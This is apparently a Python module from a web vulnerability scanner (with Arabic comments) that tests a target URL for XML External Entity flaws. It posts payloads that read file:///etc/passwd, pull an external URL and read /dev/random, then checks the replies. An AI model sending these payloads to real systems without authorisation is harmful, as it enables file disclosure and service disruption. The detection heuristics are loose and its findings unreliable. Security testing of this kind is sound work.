import aiohttp
import logging
import html
import time

logger = logging.getLogger(__name__)

async def check_xxe(target_url):
    """
    Checks for XML External Entities (XXE) vulnerabilities by sending malicious XML payloads.
    """
    vulnerabilities = []
    logger.info("Checking for XML External Entities (XXE) vulnerabilities")
    
    # قائمة الحمولات لتغطية بيئات متعددة
    payloads = [
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "http://example.com/malicious_file" >]>
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0"?>
        <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
        <data>&xxe;</data>"""
    ]
    
    headers = {'Content-Type': 'application/xml'}
    xxe_found = False

    async with aiohttp.ClientSession() as session:
        for payload in payloads:
            if xxe_found:
                break
            try:
                logger.info("Testing XXE payload")
                start_time = time.time()
                async with session.post(target_url, data=payload, headers=headers, timeout=10, ssl=False) as response:
                    if response.status != 200:
                        continue
                        
                    text = await response.text()
                    elapsed_time = time.time() - start_time
                    
                    # فحص علامات البيانات الحساسة في النص
                    if 'root:' in text or 'bin:' in text or 'malicious_file' in text:
                        vulnerabilities.append({
                            "type": "XML External Entities (XXE)",
                            "description": "Detected XXE vulnerability allowing access to system files.",
                            "location": f"POST Request with Payload: {html.escape(payload[:50])}",
                            "severity": "Critical"
                        })
                        xxe_found = True
                        logger.warning("XXE vulnerability detected: Possible sensitive file access.")
                        
                    # تحليل الأخطاء لمعرفة نقاط الضعف
                    elif any(error in text.lower() for error in ["error", "xml parsing", "doctype"]):
                        vulnerabilities.append({
                            "type": "XML Error",
                            "description": "Detected error handling issue indicating possible XXE vulnerability.",
                            "location": f"POST Request with Payload: {html.escape(payload[:50])}",
                            "severity": "High"
                        })
                        xxe_found = True
                        logger.warning("Error handling vulnerability detected.")
                    
                    # فحص التأخير في الاستجابة
                    if elapsed_time > 2:
                        vulnerabilities.append({
                            "type": "Performance Anomaly",
                            "description": "Detected abnormal delay in response, indicating potential XXE exploitation.",
                            "location": f"POST Request with Payload: {html.escape(payload[:50])}",
                            "severity": "Medium"
                        })
                        xxe_found = True
                        logger.warning("Detected performance anomaly during XXE check.")

            except Exception as e:
                logger.error(f"Error during XXE check for payload '{html.escape(payload[:50])}...': {e}")

    if not vulnerabilities:
        logger.info("No XXE vulnerabilities detected.")
    
    return vulnerabilities


async def scan(target_url):
    """
    Main scan function that wraps the check_xxe functionality.
    """
    return await check_xxe(target_url)
